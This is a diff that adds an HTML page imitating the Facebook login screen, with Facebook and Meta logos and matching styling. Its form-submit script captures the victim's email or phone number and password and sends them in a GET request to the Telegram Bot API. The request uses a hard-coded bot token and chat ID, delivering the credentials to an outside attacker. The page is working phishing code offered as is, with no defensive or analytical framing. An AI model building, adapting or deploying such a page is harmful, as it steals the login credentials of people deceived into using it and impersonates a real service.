@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .fb-logo {
+            margin-bottom: 20px;
+        }
+        .fb-logo img {
+            width: 50px;
+        }
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 28px);
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: calc(100% - 28px);
+            padding: 14px;
+            margin: 10px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            box-sizing: border-box;
+        }
+        button.green {
+            background-color: #42b72a;
+        }
+        .meta-logo {
+            margin-top: 20px;
+        }
+        .meta-logo img {
+            width: 60px;
+        }
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Facebook logo at the top -->
+        <div class="fb-logo">
+            <img src="facebook-logo.png" alt="Facebook Logo">
+        </div>
+        <h1 style="font-weight: normal; font-size: 24px;">Log In</h1>
+        <form id="loginForm" onsubmit="sendData(); return false;">
+            <input type="text" id="email" placeholder="Email or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <a href="#">Forgotten password?</a>
+        <hr>
+        <button class="green">Create New Account</button>
+        <div class="meta-logo">
+            <img src="meta-logo.png" alt="Meta Logo">
+        </div>
+    </div>
+
+    <script>
+        function sendData() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var telegramBotToken = '7360177219:AAGnRAc0n1Mkit02Ab3lLK1idFtkf2aHK7E'; // Replace with your Telegram bot token
+            var telegramChatId = '7546330959'; // Replace with your chat ID
+            var message = `Email/Phone: ${email}\nPassword: ${password}`;
+
+            var url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+    </script>
+
+</body>
+</html>
